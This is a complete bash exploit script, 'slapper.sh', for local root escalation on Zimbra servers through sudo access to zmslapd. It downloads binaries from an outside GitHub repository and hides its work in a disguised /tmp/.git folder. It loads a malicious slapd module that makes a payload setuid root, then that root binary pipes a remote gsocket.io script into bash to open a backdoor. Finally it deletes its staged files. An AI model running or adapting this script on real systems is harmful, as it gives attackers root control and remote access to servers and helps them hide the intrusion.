#!/bin/bash
echo "~ slapper.sh - zimbra zmslapd local privesc exploit ~"
echo "[+] Setting up..."
rm -rf /tmp/.git 2>&1
mkdir /tmp/.git
export PATH=$PATH:/tmp/.git
cd /tmp/.git
curl -fskSL github.com/aels/zimbra-slapper/raw/main/gcc -o gcc
curl -fskSL github.com/aels/zimbra-slapper/raw/main/cc1 -o cc1
chmod +x gcc cc1
cat << EOF > /tmp/.git/sorrymom.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/.git/init", 0, 0);
    chmod("/tmp/.git/init", 04755);
    printf("[+] done!\n");
}
EOF
cat << 'EOF' > /tmp/.git/init.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    system("curl -fsSLk gsocket.io/x | bash");
}
EOF
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libemu
/tmp/.git/gcc -o /tmp/.git/init /tmp/.git/init.c
/tmp/.git/gcc -fPIC -shared -o /tmp/.git/sorrymom.so /tmp/.git/sorrymom.c
cat << EOF > /tmp/.git/slapd.conf
include		/opt/zimbra/common/etc/openldap/schema/core.schema
modulepath	/tmp/.git
moduleload	sorrymom.so
database	mdb
maxsize		1073741824
suffix		"dc=my-domain,dc=com"
rootdn		"cn=Manager,dc=my-domain,dc=com"
rootpw		secret
directory	/opt/zimbra/data/ldap/state/openldap-data
index	    objectClass	eq
EOF
echo "[+] Triggering our exploit..."
sudo /opt/zimbra/libexec/zmslapd -u root -g root -f /tmp/.git/slapd.conf
echo "[$] Run gsocket"
/tmp/.git/init
echo "[+] Cleaning up staged files..."
rm -rf /tmp/.git
